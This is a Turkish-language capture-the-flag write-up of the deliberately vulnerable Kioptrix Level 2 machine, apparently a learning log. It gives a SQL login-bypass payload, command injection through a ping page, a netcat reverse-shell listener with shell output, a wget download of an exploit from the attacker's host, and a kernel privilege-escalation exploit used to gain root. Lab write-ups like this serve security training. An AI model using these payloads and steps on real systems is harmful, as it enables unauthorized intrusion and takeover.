# Kioptrix Level 2

**Zorluk:** Kolay-Orta
**Hedef İşletim Sistemi:** CentOS 4.5 (kernel 2.6.9)
**Sonuç:** Root alındı ✅

Saldırı zinciri:

```
Nmap → login ekranında SQL injection → command injection (pingit.php)
→ reverse shell (apache) → kernel privesc → root
```

---

## 1. Keşif (Enumeration)

1.
```bash
nmap -T4 -p- <hedef ip>
```
2
```bash
nmap -T4 -A -p<acik portlar> <hedef ip>
```

Açık portlar:

| Port | Servis | Versiyon |
| ---- | ------ | -------- |
| 22 | SSH | OpenSSH 3.9p1 |
| 80 | HTTP | Apache 2.0.52 (CentOS) |
| 111 | rpcbind | RPC #100000 |
| 443 | HTTPS | Apache 2.0.52 (CentOS) |
| 631 | IPP | CUPS 1.1 |
| 3306 | MySQL | MySQL (unauthorized) |

Sistem: CentOS 4.5, kernel 2.6.9. Web tarafı (80/443) ilk hedefim oldu.

## 2. Web — SQL Injection

Web arayüzünde bir login (giriş) ekranı vardı. Klasik authentication bypass payload'ı denedim:

```
' or '1'='1#
```

Bu, giriş sorgusunu her zaman doğru hale getirerek beni oturuma soktu. (Payload kullanıcı adı ve şifre alanına girildiğinde `WHERE user='' or '1'='1'#...` şeklinde sorguyu tamamen bypass ediyor.)

Bu arada dizin taraması da yaptım (ffuf):

```
http://<hedef>/index.php
http://<hedef>/pingit.php
http://<hedef>/manual/
```

## 3. Web — Command Injection (asıl RCE)

Giriş yaptıktan sonra bir **ping** fonksiyonuna (`pingit.php`) ulaştım — kullanıcıdan bir IP alıp `ping` atıyordu. Burp Suite ile isteği yakalayıp incelediğimde girdinin doğrudan shell'e geçtiğini fark ettim.

**Önemli ders:** Başta bunu SQL injection sandım, ama aslında bu bir **OS Command Injection** — girdi PHP tarafında muhtemelen `system()`/`exec()` ile doğrudan shell'e veriliyor. İkisini ayırt etmek kritikti.

Shell operatörü ekleyerek komut zincirledim:

```
127.0.0.1; <komut>
```

Ardından Kali'de bir netcat dinleyici açıp reverse shell aldım:

```bash
# Kali (saldırgan) tarafı
nc -lvnp 4444
```

Girdi alanına reverse shell payload'ı zincirledim ve `apache` kullanıcısı olarak shell düştü:

```
connect to [192.168.56.170] from (UNKNOWN) [192.168.56.172]
bash-3.00$ whoami
apache
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 ... i686 GNU/Linux
bash-3.00$ cat /etc/*release
CentOS release 4.5 (Final)
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```

## 4. Yanlış Yaptığım / Zaman Kaybettiğim Yerler

Bu box'ta initial shell'den sonra birkaç kez yanlış yola saptım:

- **DoS exploitine yöneldim.** searchsploit'te Apache 2.0.52 için bir DoS exploiti buldum ve onu denemeyi düşündüm. Bu tamamen yanlış yöndü — elimde zaten bir shell varken DoS sadece servisi çökertir, bana yetki kazandırmaz. Doğru adım privilege escalation'dı, DoS değil. **Ders:** Shell aldıktan sonra hedef "erişimi bozmak" değil, "yetkiyi yükseltmek".

- **İlk kernel exploitinde Python versiyon sorunu.** Bir privesc PoC'sini (`9844.py`) çalıştırmaya çalıştım ama hedefteki eski Python `subprocess` modülünü tanımadı:
  ```
  ImportError: No module named subprocess
  ```
  Eski CentOS'un Python'ı çok eskiydi. **Ders:** Aynı CVE için exploit-db'de birden fazla PoC olur; hedefin Python/C versiyonuna uyan alternatifi seçmek gerekiyor. Python yerine C tabanlı PoC'ye geçmek daha sağlıklıydı.

- **Dosya transferinde wget sözdizimi hatası.** Exploiti hedefe indirirken yanlış komut kullandım:
  ```
  wget http://192.168.56.170:8000 9542.c   # YANLIŞ — boşluk var, 9542.c'yi ayrı URL sanıyor
  ```
  Doğrusu tam URL vermekti: `wget http://192.168.56.170:8000/9542.c`

## 5. Privilege Escalation

Doğru metodolojiyle sistem bilgisi topladım:

```bash
uname -a          # kernel 2.6.9
cat /etc/*release # CentOS 4.5
id
sudo -l
```

Kernel 2.6.9 + CentOS 4.5 için privesc exploiti aradım:

```bash
searchsploit linux kernel 2.6.9 local
```

Uygun olan:

```
Linux Kernel 2.4/2.6 (RedHat / Fedora / CentOS 4) -
'sock_sendpage()' Ring0 Privilege Escalation | linux/local/9479.c
```

Bu **sock_sendpage() (CVE-2009-2698)** exploiti. Hedefte derleyip çalıştırdım, root alındı.

## 6. Öğrenilen Kavramlar

- SQL injection (auth bypass) ile OS command injection'ı ayırt etmek
- Command injection'da shell operatör zincirleme (`;`, `&&`, `|`)
- Burp Suite ile isteği yakalayıp değiştirme
- netcat reverse shell mantığı
- Kernel versiyonuna göre privesc exploiti eşleştirme
- Initial access sonrası doğru metodoloji: DoS değil, enumeration → privesc

## 7. Bir Dahaki Sefere / Notlar

- İlk shell'den sonra LinPEAS gibi bir enumeration scripti çalıştırmak, doğru privesc yolunu manuel aramaktan çok daha hızlı olurdu.
- Exploit seçerken hedefin araç versiyonlarını (Python, gcc) baştan kontrol etmek, uyumsuz PoC'lerle vakit kaybetmeyi engeller.
